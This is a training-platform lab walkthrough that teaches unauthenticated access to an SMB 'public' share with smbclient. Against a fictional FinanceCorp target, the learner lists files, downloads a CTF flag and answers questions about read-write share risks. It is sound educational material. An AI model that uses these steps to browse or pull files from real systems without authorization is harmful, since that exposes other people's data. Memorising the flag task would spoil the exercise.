# Exercise 2.3: Anonymous Share Access

## Before You Begin

In Exercise 2.2, you listed the shares on the target and noted their names and types. But listing shares and accessing them are two different things. A share might appear in the listing but reject your connection when you try to open it. this exercise tests whether you can actually browse the contents of a share without providing any credentials.

Your VPN must be connected and your terminal open. You should be comfortable listing shares with `smbclient -L` from the previous exercise.

## Scenario

Your share enumeration of FinanceCorp's SMB service revealed several available shares, including one named "public." James Mitchell, the engagement lead, is concerned that some shares might be accessible without authentication, exposing sensitive information to anyone on the network. Your task is to connect directly to the public share, browse its contents, and determine what data is exposed.

## Your Objectives

- Connect to the public share without credentials and list its contents
- Understand SMB anonymous access and interactive smbclient commands
- Browse directories and identify exposed files
- Capture the flag

---

## Background: Anonymous Access: What It Means and Why It Is Dangerous

Anonymous access means connecting to a file share without providing a username or password. When you connect this way, the SMB server maps your session to a built-in "guest" account. Depending on how the administrator configured the share, that guest account may have limited permissions or surprisingly broad ones.

The risk depends on the level of access granted:

- **Read-only anonymous access** exposes every file in the share to anyone who can reach the server. Sensitive documents, configuration files, database exports, and credentials left behind by administrators are all visible and downloadable.
- **Read-write anonymous access** is worse. An attacker can read existing files and also upload new ones; backdoors, malware, phishing documents; or modify files that legitimate users trust and open without suspicion.

In real environments, anonymous shares frequently contain data that administrators never intended to expose. A "public" share might start as a place for non-sensitive documents, but over time, someone drops a spreadsheet with passwords in it, or a backup script writes credentials into a log file. The share becomes a liability that no one monitors.

The Samba configuration directive that controls this behavior is `guest ok = yes`. When this is set on a share definition, the server allows connections without any authentication. Identifying this misconfiguration and proving what data it exposes is a core penetration testing skill.

---

## Tool Primer: smbclient Interactive Mode

In Exercises 2.1 and 2.2, you used smbclient with the `-L` flag to list shares. That was a one-shot command; it printed the listing and returned you to your shell. this exercise introduces **interactive mode**, where you connect to a specific share and stay connected, issuing commands inside the share just like you would in an FTP session.

**Connecting to a specific share:**

```bash
smbclient //<target_ip>/public -N
```

Notice the difference from previous labs. There is no `-L` flag. Instead, you specify the full path to the share: `//<target_ip>/public`. The `-N` flag still means "no password." If the connection succeeds, your prompt changes:

```
smb: \>
```

The `smb: \>` prompt means you are now inside the share. You are no longer in your local shell. Every command you type is interpreted by smbclient and executed against the remote share.

**Essential commands:**

| Command | What It Does |
|---------|-------------|
| `ls` or `dir` | List files and directories in the current location |
| `cd <dir>` | Change into a directory on the remote share |
| `pwd` | Show your current directory within the share |
| `get <file>` | Download a file from the share to your local machine |
| `put <file>` | Upload a file from your local machine to the share (if write access is allowed) |
| `exit` or `quit` | Disconnect from the share and return to your local shell |

**Reading the `ls` output:**

When you run `ls` inside the share, the output looks like this:

```
  .                                   D        0  Wed Feb 18 10:23:45 2026
  ..                                  D        0  Wed Feb 18 10:23:45 2026
  readme.txt                          N      247  Wed Feb 18 10:23:45 2026
  reports                             D        0  Wed Feb 18 10:23:45 2026
  flag.txt                            N       24  Wed Feb 18 10:23:45 2026

		12345678 blocks of size 1024. 9876543 blocks available
```

Each line shows:

- The **filename** on the left
- A **type flag**: `D` means directory, `N` means a normal file
- The **file size** in bytes
- A **timestamp** showing when the file was last modified

The last line shows disk space information for the share, which is generally not relevant to your assessment.

**A sample interactive session:**

```
smb: \> ls
  .                                   D        0  Wed Feb 18 10:23:45 2026
  ..                                  D        0  Wed Feb 18 10:23:45 2026
  readme.txt                          N      247  Wed Feb 18 10:23:45 2026
  reports                             D        0  Wed Feb 18 10:23:45 2026

smb: \> cd reports
smb: \reports\> ls
  .                                   D        0  Wed Feb 18 10:23:45 2026
  ..                                  D        0  Wed Feb 18 10:23:45 2026
  q4_summary.txt                      N     1024  Wed Feb 18 10:23:45 2026

smb: \reports\> get q4_summary.txt
getting file \reports\q4_summary.txt of size 1024 as q4_summary.txt (250.0 KiloBytes/sec)
smb: \reports\> exit
```

Notice how the prompt changes as you navigate. `smb: \>` means you are at the root of the share. `smb: \reports\>` means you are inside the `reports` directory.

---

## Walkthrough

### Step 1: Launch the Exercise

Open the platform in your browser and start the exercise environment.

- Navigate to **Exercises** and locate Exercise 2.3; Anonymous Share Access
- Click **Launch** and wait for the status to change to **Running**
- Note the **target IP** displayed in the Active Lab View

### Step 2: Connect to the Public Share

!!! kali "Connect to the public share"
    Connect to the "public" share without credentials. Replace `<target_ip>` with the IP shown in the Active Lab View.

    ```bash
    smbclient //<target_ip>/public -N
    ```

    If the connection succeeds, your prompt changes to `smb: \>`. If it fails, you will see an error message; verify that the lab is running and that your VPN is connected.

### Step 3: List the Contents

!!! kali "List the share contents"
    Once you are inside the share, list the files and directories.

    ```
    smb: \> ls
    ```

    Note everything that appears. Look for filenames that suggest sensitive content; documents, configuration files, text files, and any subdirectories that might contain additional material.

### Step 4: Browse Directories

!!! kali "Browse into subdirectories"
    If the listing shows any directories, change into them and list their contents.

    ```
    smb: \> cd <dirname>
    smb: \<dirname>\> ls
    ```

    Repeat this for every directory you find. In a real engagement, you would methodically explore the entire share structure.

### Step 5: Download the Flag

!!! kali "Download the flag file"
    Look for a file named `flag.txt` or similar. When you find it, download it to your local machine.

    ```
    smb: \> get flag.txt
    ```

    The `get` command copies the file from the remote share to your current working directory on your local machine. You will see a message confirming the download with the file size and transfer speed.

### Step 6: Exit the Share

!!! kali "Disconnect from the share"
    Disconnect from the share and return to your local shell.

    ```
    smb: \> exit
    ```

### Step 7: Read the Flag

!!! kali "Read the downloaded flag"
    Now that the file is on your local machine, read it.

    ```bash
    cat flag.txt
    ```

    The flag is in `OCR{<flag_here>}` format.

Copy it and paste it into the **Submit Flag** form on the platform and click **Submit**.

---

## Record Your Findings

> **Share listing (from inside the share):**
>
> ```
> (paste your smb: \> ls output here)
> ```
>
> **Files found:**
>
> | Filename | Type (File/Dir) | Size |
> |----------|----------------|------|
> |          |                |      |
> |          |                |      |
> |          |                |      |
> |          |                |      |
>
> **How to submit:** enter the flag on the exercise page exactly as you recovered it, keeping the `OCR{...}` wrapper.
>
> **Flag:** ___________________________

---

## Analysis Questions

**1. The share is configured as read-write. Beyond reading files, what could an attacker do with write access to an anonymous share?**

??? note "Reveal Answer"

    An attacker with write access could upload malicious files such as backdoors or malware, modify existing documents to inject malicious content, plant phishing documents designed to harvest credentials from legitimate users, or use the share as a staging area for tools and payloads during lateral movement. A writable anonymous share effectively gives an attacker a foothold on the server's file system without ever needing to authenticate.

**2. How would you test whether a share allows write access without causing damage?**

??? note "Reveal Answer"

    Create a small, harmless test file on your local machine and attempt to upload it with `put test.txt`. If the upload succeeds, immediately remove it with `del test.txt`. If the upload is rejected with an access denied error, the share is read-only. The upload-then-delete test confirms write access without leaving persistent changes or disrupting existing files.

**3. Why might an administrator intentionally create an anonymous share?**

??? note "Reveal Answer"

    Common reasons include distributing public files to users who do not have domain accounts, hosting printer drivers that any machine on the network needs to download, deploying software packages across the organization, or providing a shared drop-off location for external partners. The risk is that these shares are often created for a short-term purpose and then forgotten, or that over time someone places sensitive files in them without realizing the share is accessible to everyone on the network.

---

## Key Takeaways

- `smbclient //<target_ip>/public -N` connects to a specific share without credentials; this is different from `-L`, which only lists shares
- The interactive `smb: \>` prompt works like an FTP client; use `ls`, `cd`, `get`, and `put` to navigate and transfer files
- Anonymous access to file shares is a critical misconfiguration that exposes real data to anyone who can reach the server
- Read-write anonymous access is even more dangerous; it allows attackers to upload, modify, and delete files on the share
- You can now browse anonymous shares and confirm what they contain. The next exercise focuses on the most impactful action: downloading files to prove data exposure
